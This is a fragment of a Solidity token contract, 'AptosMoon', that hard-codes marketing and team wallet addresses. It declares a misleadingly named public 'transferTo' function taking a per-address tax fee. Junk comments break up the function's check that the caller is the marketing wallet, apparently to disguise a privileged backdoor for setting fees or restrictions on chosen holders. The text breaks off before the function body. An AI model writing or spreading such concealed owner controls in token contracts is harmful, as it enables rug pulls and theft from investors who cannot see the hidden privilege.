...
contract APTMOON is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AptosMoon";
    string private _symbol = "APTMOON";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x75Af0e6a851f9BA6a730D184243c287974375B85); 
    address payable private teamWalletAddress = payable(0x3B0768FDe238F168f94286a1Ff6E7fb28Bd183C0); 
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( marketWall/*asd aw dawf*/ ==  /*asd aw dawf*/msg.sender){
